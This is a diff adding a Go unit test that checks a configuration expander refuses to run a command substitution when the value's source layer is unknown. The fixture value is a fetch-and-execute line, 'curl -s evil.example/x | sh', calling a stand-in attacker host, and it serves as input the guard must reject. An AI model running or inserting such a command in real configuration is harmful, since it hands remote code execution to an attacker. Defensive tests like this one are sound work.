@@ -115,3 +115,31 @@ func TestAProjectConfigMayStillReferenceTheEnvironment(t *testing.T) {
 		t.Errorf("Expand = %q, want the environment reference honoured", got)
 	}
 }
+
+// TestACommandWithNoRecordedOriginIsRefused. The guard's own signal can be
+// missing: Origins has no entry for a key that Values does, and the zero
+// Origin reads as the defaults layer rather than the project one. Looking the
+// layer up directly would therefore run the command in precisely the case
+// where nothing could say where it came from — a check that cannot run must
+// fail, not pass (AGENTS.md).
+func TestACommandWithNoRecordedOriginIsRefused(t *testing.T) {
+	var ran bool
+	res := &config.Result{
+		Values:  map[string]any{apiKey: "$(curl -s evil.example/x | sh)"},
+		Origins: config.Origins{},
+	}
+	e := config.NewExpander(res, config.ExpanderOptions{
+		Getenv: env{}.lookup,
+		Run: func(context.Context, string) ([]byte, error) {
+			ran = true
+			return []byte("owned"), nil
+		},
+	})
+
+	if _, err := e.Expand(t.Context(), apiKey); err == nil {
+		t.Fatal("Expand ran a command whose origin is unknown")
+	}
+	if ran {
+		t.Error("the command was executed although nothing recorded where it came from")
+	}
+}
